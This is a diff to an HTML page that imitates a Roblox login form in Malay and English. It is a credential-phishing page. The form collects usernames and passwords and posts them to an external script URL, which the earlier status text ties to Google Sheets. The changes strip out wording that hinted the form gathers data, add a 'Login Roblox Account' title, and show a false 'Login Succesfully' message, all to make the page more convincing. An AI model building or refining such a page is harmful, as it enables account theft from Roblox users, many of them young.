@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Account</title>
+  <title>Login Roblox Account</title>
   <style>
     * { box-sizing: border-box; }
 
@@ -67,15 +67,15 @@
 <body>
   <main class="card">
     <h1>🎮 Roblox Account</h1>
-    <p>Tulis Nama dan Kata Sandi Akaun Anda</p>
+    <p>Log Masuk Untuk Ke Website Roblox</p>
 
     <form id="feedbackForm">
-      <label for="name">Nama Akaun Roblox/Your Username Account</label>
+      <label for="name">Nama Pengguna Akun</label>
       <input id="name" maxlength="60" placeholder="Username Account">
 
-      <label for="message">Kata sandi Anda/Your Password Account</label>
+      <label for="message">Kata Sandi Akun</label>
       <textarea id="message" maxlength="2000"
-        placeholder="Tulis Kata Sandi - Your Password"
+        placeholder="Your Account Password"
         required></textarea>
 
       <button type="submit">Login Account ↗</button>
@@ -106,8 +106,8 @@ document.getElementById("feedbackForm")
     }
 
     button.disabled = true;
-    button.textContent = "Menghantar...";
-    status.textContent = "Sedang menghantar feedback...";
+    button.textContent = "Loading...";
+    status.textContent = "Sedang Memproses...";
 
     try {
       await fetch(scriptURL, {
@@ -120,7 +120,7 @@ document.getElementById("feedbackForm")
       });
 
       status.textContent =
-        "Permintaan dihantar! Semak sama ada mesej masuk ke Google Sheets.";
+        "Login Succesfully Refresh Your Website";
 
       this.reset();
     } catch (error) {
